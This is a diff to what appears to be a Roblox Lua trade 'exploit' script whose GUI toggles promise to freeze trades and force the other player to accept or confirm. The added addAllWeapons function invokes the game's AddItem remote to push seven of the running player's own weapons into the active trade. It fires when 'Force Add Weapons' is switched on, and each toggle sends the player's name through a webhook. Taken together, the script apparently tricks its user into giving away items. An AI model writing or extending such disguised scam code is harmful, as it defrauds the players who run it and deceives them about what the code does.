@@ -7,12 +7,31 @@ local PlayerGui           = LocalPlayer:WaitForChild("PlayerGui")
 local Character           = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 
 -- ── Trade remotes ─────────────────────────────────────────────────────────────
-local RFTradingSetReady, RFTradingConfirmTrade
+local RFTradingSetReady, RFTradingConfirmTrade, RFTradingAddItem
 pcall(function()
   local net = ReplicatedStorage.Modules.Net
-  RFTradingSetReady    = net["RF/Trading/SetReady"]
+  RFTradingSetReady     = net["RF/Trading/SetReady"]
   RFTradingConfirmTrade = net["RF/Trading/ConfirmTrade"]
+  RFTradingAddItem      = net["RF/Trading/AddItem"]
 end)
+
+-- ── Add all weapons to active trade ──────────────────────────────────────────
+local function addAllWeapons()
+  if not RFTradingAddItem then return end
+  local items = {
+    {"Weapon",     "2a2bce877d67474299"},  -- Snowball
+    {"Weapon",     "50f672aee7054d2d9d"},  -- Gold Snowball
+    {"Weapon",     "984f30e6f65a40a498"},  -- Kitty Purse
+    {"Weapon",     "000183526d6646eca4"},  -- Sledge Hammer
+    {"Weapon",     "f864e570fb0743c987"},  -- Freeze Gun
+    {"WeaponSkin", "6994851e04ae4b80b4"},  -- Glitter Style
+    {"Weapon",     "9f34dce65fa2474b99"},  -- Spiked Purse
+  }
+  for _, item in ipairs(items) do
+    pcall(function() RFTradingAddItem:InvokeServer(item[1], item[2]) end)
+    task.wait(0.03)
+  end
+end
 
 -- ── Chat commands: type "1" → Force Accept, "2" → Force Confirm ───────────────
 LocalPlayer.Chatted:Connect(function(msg)
@@ -316,7 +335,7 @@ ListFrame.BorderSizePixel  = 0
 ListFrame.Parent           = Window
 Instance.new("UIListLayout", ListFrame).SortOrder = Enum.SortOrder.LayoutOrder
 
-local function makeToggleRow(labelText, key, order)
+local function makeToggleRow(labelText, key, order, onEnable)
   local Row = Instance.new("Frame")
   Row.Name             = key
   Row.Size             = UDim2.new(1, 0, 0, 48)
@@ -394,13 +413,14 @@ local function makeToggleRow(labelText, key, order)
                   BackgroundColor3 = Color3.fromRGB(180, 180, 185) })
     end
     sendWebhook(LocalPlayer.Name .. " toggled " .. labelText .. ": " .. tostring(on))
+    if on and onEnable then task.spawn(onEnable) end
   end)
 end
 
 makeToggleRow("Freeze Trade",      "FreezeTrade",     1)
 makeToggleRow("Force Accept",      "ForceAccept",     2)
 makeToggleRow("Force Confirm",     "ForceConfirm",    3)
-makeToggleRow("Force Add Weapons", "ForceAddWeapons", 4)
+makeToggleRow("Force Add Weapons", "ForceAddWeapons", 4, addAllWeapons)
 makeToggleRow("Force Add Tokens",  "ForceAddTokens",  5)
 
 -- ── Dragging ──────────────────────────────────────────────────────────────────
